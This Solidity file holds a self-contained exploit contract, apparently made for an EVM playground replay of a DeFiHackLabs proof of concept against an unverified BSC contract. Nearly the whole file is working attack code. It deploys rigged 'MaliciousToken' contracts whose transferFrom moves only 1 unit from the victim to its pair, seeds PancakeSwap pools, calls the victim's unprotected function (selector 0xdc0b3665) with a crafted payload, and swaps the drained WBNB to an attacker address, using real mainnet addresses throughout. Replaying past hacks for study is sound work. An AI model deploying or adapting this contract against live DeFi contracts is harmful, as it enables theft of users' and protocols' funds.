// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-08-BscInitcodeToken).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry ContractTest
// (deploy two fee-on-transfer ERC20s, seed PancakeSwap pools with dust
// liquidity, call the unverified victim with attacker-controlled token
// addresses, then reverse-swap for profit) — there is no standalone attack
// contract in the test file. This contract is a faithful, self-contained copy
// of that inline flow (testExploit()) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/BscInitcodeToken_exp.sol.
//
// Root cause: the unverified victim 0x0B0d...c4Da exposes a public function
// (selector 0xdc0b3665, no access control) that swaps its OWN WBNB balance
// through a caller-supplied token path with amountOutMin = 0 and never
// reconciles the fee-on-transfer shortfall on the return leg, letting the
// attacker route the swap through attacker-owned fee-on-transfer tokens/pools
// to siphon the victim's WBNB.

interface IPancakeRouter {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract BscInitcodeDrain {
    address constant VICTIM = 0x0B0d67049fc34fD8aB2559a456A80276E805c4DA;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ATTACKER = 0xEBE15A67e37203563d0D99AafAf06eCf41305FbA;

    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);
    IUniswapV2Factory private constant factory =
        IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);

    MaliciousToken private ddToken;
    MaliciousToken private secondToken;

    receive() external payable {}

    function run() external {
        ddToken = new MaliciousToken("DD", "DD");
        secondToken = new MaliciousToken("Token57", "T57");

        ddToken.approve(PANCAKE_ROUTER, type(uint256).max);
        secondToken.approve(PANCAKE_ROUTER, type(uint256).max);

        uint256 deadline = block.timestamp + 1_800;
        router.addLiquidityETH{value: 10_000_000_000_000}(
            address(ddToken), 0.1 ether, 0, 0, address(this), deadline
        );
        router.addLiquidity(
            address(ddToken), address(secondToken), 0.1 ether, 0.1 ether, 0, 0, address(this), deadline
        );

        address ddSecondPair = factory.getPair(address(ddToken), address(secondToken));
        secondToken.setVictimTransferRule(VICTIM, ddSecondPair);

        uint256 victimWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(VICTIM);
        bytes memory trigger = _buildVictimCall(victimWbnbBefore);
        (bool ok,) = VICTIM.call(trigger);
        require(ok, "victim call failed");

        address[] memory path = new address[](2);
        path[0] = address(ddToken);
        path[1] = WBNB_TOKEN;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            1_000_000 ether, 0, path, ATTACKER, block.timestamp + 1_800
        );
    }

    function _buildVictimCall(
        uint256 amountIn
    ) internal view returns (bytes memory) {
        return abi.encodeWithSelector(
            bytes4(0xdc0b3665),
            uint256(0),
            uint256(0),
            address(secondToken),
            address(ddToken),
            amountIn,
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0)
        );
    }
}

contract MaliciousToken {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    address private victim;
    address private victimPair;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
        totalSupply = 10_000_000 ether;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setVictimTransferRule(address victim_, address victimPair_) external {
        victim = victim_;
        victimPair = victimPair_;
    }

    function balanceOf(
        address account
    ) external view returns (uint256) {
        return balances[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowances[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "insufficient allowance");
            allowances[from][msg.sender] = allowed - amount;
        }

        uint256 moved = _effectiveTransferAmount(from, to, amount);
        _transfer(from, to, moved);
        return true;
    }

    function _effectiveTransferAmount(address from, address to, uint256 amount) private view returns (uint256) {
        if (from == victim && to == victimPair) {
            return 1;
        }
        return amount;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(balances[from] >= amount, "insufficient balance");
        unchecked {
            balances[from] -= amount;
            balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }
}
